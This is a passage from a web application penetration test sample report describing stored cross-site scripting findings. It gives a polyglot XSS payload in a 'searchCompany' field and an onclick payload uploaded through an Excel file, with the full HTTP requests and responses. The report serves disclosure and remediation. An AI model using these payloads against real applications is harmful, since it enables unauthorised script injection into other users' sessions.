{"text": "be found in Appendix A – Findings.\\nAttack Narrative Stored Cross-Site Scripting Severity: High Cross-Site Scripting (XSS) is a client-side code injection attack. It occurs when data enters from an untrusted source and is included in dynamic content without being validated for malicious content by the application. Instance 1 The application allows malicious JavaScript to be saved into the \"searchCompany\" field while editing contact information for application users. The following payload was used to execute a JavaScript alert box: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/-- !>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>\\x3e Entering this payload into the “user searchCompany” field stores the XSS permanently on the application: POST /manage/crm/user?email=test%40the company HTTP/2 Host: {URL} Cookie:<snip> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 629 Origin: https://{URL} Referer: https://{URL}/manage/crm/user?email=test%40the company Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document\\nSec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Te: trailers Connection: close user%5Bname%5D=test1&user%5Bemail%5D=test%40the company&user[searchCompany]=jaVasCript%3A%2F*- %2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F%28%2F*+*%2FoNcliCk%3Dalert%28document.do main%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C% 2FteXtarEa%2F%3C%2FscRipt%2F-- %21%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%28document.domain%29%2F%2F%3E%5Cx3e& user%5Bcompany_id%5D=&tz=Africa%2FAbidjan&user%5Bpassword%5D=&user%5Bphone_number%5D =&user%5Baccessrole_id%5D=&user%5Baccount_status%5D=email_verified&user%5Bservice_name%5D =&user%5Bpricing_plan%5D=0&user%5Bindividual_sessions%5D=5&user%5Bglobal_panelist%5D=0&sav e=once HTTP/2 302 Found Date: Wed, 28 Jul 2021 02:21:13 GMT Content-Type: text/html; charset=UTF-8 Content-Length: 0 Location: https://{URL}/manage/crm/user?email=test%40the company Server: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img-src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Access-Control-Allow-Origin: https://{URL} Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: GET,POST,PUT,PATCH,DELETE,OPTIONS Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X- Requested-With Vary: Origin Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate\\nDate: Wed, 28 Jul 2021 02:27:50 GMT Content-Type: text/html; charset=UTF-8 Content-Length: 59488 Server: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img-src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Vary: Accept-Encoding name=\"user[searchCompany]\" class=\"form-control\" value=\"\" /> --> <input type=\"text\" id=\"companyName\" name=\"user[searchCompany]\" class=\"form-control\" value=\"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(document.domain) )//%0D%0A%0d%0a//////-- !&gt;\\x3csVg/\\x3e\" /> <input type=\"hidden\" id=\"companyId\" name=\"user[company_id]\" value=\"\" />\\nInstance 2 It is possible to upload malicious JavaScript through an Excel file upload. An example Excel template to upload application candidates can be downloaded. Inserting the following payload into either the First Name or Last Initial fields columns and uploading the template will cause store the XSS on the application: <h1 onclick=\"alert(1)\">test</h1> Figure 1 - Malicious Excel File Upload The saved XSS payload can be observed in a proxy: GET /ajax/project/32708/unreviewedCandidates HTTP/2 Host: {URL} Cookie: <snip> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0 Accept: */* Accept-Language: en-US,en;q=0.5\\nAccept-Encoding: gzip, deflate Referer: https://{URL}/project/32708/no-referrer Content-Type: application/x-www-form-urlencoded;charset=UTF-8 X-Requested-With: XMLHttpRequest Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Cache-Control: max-age=0 Te: trailers Connection: close HTTP/2 200 OK Date: Wed, 28 Jul 2021 12:44:21 GMT Content-Type: application/json; charset=utf-8 Content-Length: 12484 Server: Apache/2.4 Strict-Transport-Security: max-age=31536000; includeSubdomains X-Frame-Options: SAMEORIGIN X-Content-Type-Options: nosniff X-Xss-Protection: 1; mode=block Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline'; object-src 'none'; connect-src *; img-src https: blob: mediastream: data:; font-src https: data:; worker-src blob: Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Content-Disposition: attachment; filename=json.txt X-Content-Type-Options: nosniff Vary: Accept-Encoding\\n{\"id\":2350,\"name\":\"<h1 onclick=\\\"alert(1)\\\">test<\\/h1>\",\"email\":\"\",\"hasEmail\":false,\"phoneNumber\":\"\",\"verificationStatus\":\"unreviewe d\",\"mos\":null,\"hasAudio\":false,\"hasVideo\":false,\"browserName\":null,\"browserVersion\":null,\"isBrowserSuppo rted\":false,\"city\":\"<h1 onclick=\\\"alert(1)\\\">test<\\/h1>\",\"region\":null,\"country\":null,\"osName\":null,\"osVersion\":null,\"participantType\":\" main\",\"agencyId\":\"7\\/28\\/2021 12:34\",\"agencyUserId\":3402,\"assignedDiscussion\":null,\"notificationsOn\":false,\"autoTechCheckLink\":\"https:\\/ \\/{URL}\\/recruiting\\/videoResponse?recruitId=4be1087e-4172-4a9e-903f- 761c01deb8ce\",\"videoResponseLink\":null,\"recruitImageLink\":null,\"screenerLink\":\"\\/ajax\\/recruit\\/4be1087e- 4172-4a9e-903f- 761c01deb8ce\\/screener\",\"assignments\":[],\"availabilities\":[],\"isAgencyRecruit\":true,\"canBeUpdated\":true,\"ag encyName\":\"Assessor PPL1\",\"agencyEmail\":\"dev+assessor_purplesec.us@the company\",\"agencyPhoneNumber\":\"\",\"resubmittedAt\":null,\"techCheckLinkSent\":null,\"interviewInviteSent\":null ,\"techCheckStatus\":\"Not Sent\",\"techCheckNudgeSent\":false,\"inviteStatus\":null,\"dispositionHistory\":{\"conferences\":[],\"dispositions\":{} [...] The following screenshot shows the XSS executing", "metadata": {"doc_id": "Web-Application-Penetration-Test-Sample-Report", "chunk_id": 1}}